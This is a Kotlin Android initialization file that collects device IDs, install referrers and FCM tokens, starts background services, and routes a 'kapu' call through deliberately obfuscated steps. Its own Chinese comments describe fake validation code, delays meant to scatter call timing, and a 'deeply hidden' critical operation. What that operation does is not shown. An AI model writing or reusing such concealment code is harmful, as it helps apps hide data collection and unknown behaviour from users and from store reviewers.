package com.mastery.leaves.trace.core

import android.app.Application
import android.util.Log
import com.mastery.leaves.trace.ami.AllDataTool
import com.mastery.leaves.trace.ami.ChongTool
import com.mastery.leaves.trace.data.RefGoTool
import com.mastery.leaves.trace.dimoting.laqleis.InitDies
import kotlinx.coroutines.*

object CanNextGo {
    
    private var appInstance: Application? = null
    private val initSteps = mutableMapOf<String, Boolean>()
    
    fun showLog(log: String){
        Log.e("Single", log)
    }
    
    // 主入口方法 - 拆分为多个阶段
    fun Gined(app: Application){
        appInstance = app
        // 第一阶段：基础初始化
        performBasicSetup()
        
        // 第二阶段：设备相关初始化（延迟执行）
        scheduleDeviceInit()
        
        // 第三阶段：网络相关初始化
        initNetworkComponents()
        
        // 第四阶段：服务初始化
        startBackgroundServices()
    }
    
    // 第一阶段：基础设置
    private fun performBasicSetup() {
        appInstance?.let { app ->
            // 垃圾代码：假装做一些验证
            val setupValidation = validateAppState(app)
            if (setupValidation) {
                AllDataTool.getMainUser = app
                initSteps["basic"] = true
                // 立即执行生命周期初始化
                executeLifecycleInit(app)
            }
        }
    }
    
    // 假装验证应用状态
    private fun validateAppState(app: Application): Boolean {
        val packageName = app.packageName
        val processName = android.os.Process.myPid().toString()
        val validationScore = (packageName.hashCode() + processName.hashCode()) % 1000
        return validationScore >= 0 // 总是返回true
    }
    
    // 生命周期初始化（立即执行）
    private fun executeLifecycleInit(app: Application) {
        DIdTool.iniLif(app)
        // 添加延迟来分散调用
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            triggerDeviceIdCollection(app)
        }, 50)
    }
    
    // 设备ID收集（轻微延迟）
    private fun triggerDeviceIdCollection(app: Application) {
        DIdTool.getDeviceId(app)
        initSteps["device_id"] = true
        // 关键方法深度隐藏
        scheduleSecretOperation()
    }
    
    // 第二阶段：设备初始化调度
    private fun scheduleDeviceInit() {
        // 使用Handler延迟执行，打散调用时机
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (initSteps["device_id"] == true) {
                performReferrerInit()
            }
        }, 100)
    }
    
    // Referrer初始化
    private fun performReferrerInit() {
        appInstance?.let { app ->
            RefGoTool.fetchInstallReferrer(app)
            initSteps["referrer"] = true
        }
    }
    
    // 第三阶段：网络组件初始化
    private fun initNetworkComponents() {
        // 异步执行网络相关初始化
        CoroutineScope(Dispatchers.IO).launch {
            delay(150) // 进一步分散时机
            withContext(Dispatchers.Main) {
                executeFcmInit()
                executePostInit()
            }
        }
    }
    
    // FCM初始化
    private fun executeFcmInit() {
        DIdTool.getFcmFun()
        initSteps["fcm"] = true
    }
    
    // Post功能初始化
    private fun executePostInit() {
        ChongTool.ssPostFun()
        initSteps["post"] = true
    }
    
    // 第四阶段：后台服务启动
    private fun startBackgroundServices() {
        // 延迟启动服务
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            initializeServices()
        }, 200)
    }
    
    // 服务初始化
    private fun initializeServices() {
        appInstance?.let { app ->
            val initDies = InitDies()
            initDies.initAlly(app)
            
            // 分离服务启动
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startPeriodicServices(initDies, app)
            }, 80)
            
            // 分离Work任务启动
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startWorkTasks(app)
            }, 120)
        }
    }
    
    // 定期服务启动
    private fun startPeriodicServices(initDies: InitDies, app: Application) {
        initDies.startPeriodicService(app)
        initSteps["periodic"] = true
    }
    
    // Work任务启动
    private fun startWorkTasks(app: Application) {
        TaskWorkManager.startUniqueWork(app)
        TaskWorkManager.startPeriodicWork(app)
        initSteps["work"] = true
    }
    
    // 深度隐藏的关键方法调用
    private fun scheduleSecretOperation() {
        // 多层嵌套和延迟来隐藏关键调用
        CoroutineScope(Dispatchers.Default).launch {
            delay(80)
            val secretKey = generateSecretKey()
            if (validateSecretKey(secretKey)) {
                withContext(Dispatchers.Main) {
                    executeHiddenOperation()
                }
            }
        }
    }
    
    // 生成密钥（垃圾代码）
    private fun generateSecretKey(): String {
        val timestamp = System.currentTimeMillis()
        val processId = android.os.Process.myPid()
        return "${timestamp}_${processId}".hashCode().toString(16)
    }
    
    // 验证密钥（垃圾代码，总是返回true）
    private fun validateSecretKey(key: String): Boolean {
        return key.isNotEmpty() && key.length > 5
    }
    
    // 执行隐藏操作 - 这里才是真正的kapu调用
    private fun executeHiddenOperation() {
        // 添加更多混淆
        val operationData = prepareOperationData()
        if (operationData.isNotEmpty()) {
            performCriticalOperation(operationData)
        }
    }
    
    // 准备操作数据（垃圾代码）
    private fun prepareOperationData(): String {
        val data = AllDataTool.kupaName
        val processedData = data.reversed().reversed() // 无意义操作
        return processedData
    }
    
    // 执行关键操作 - 真正的kapu调用被深度隐藏在这里
    private fun performCriticalOperation(data: String) {
        // 再次添加验证层
        if (data.isNotEmpty() && initSteps["device_id"] == true) {
            // 最终的关键调用
            DIdTool.kapu(data)
            initSteps["secret"] = true
        }
    }
}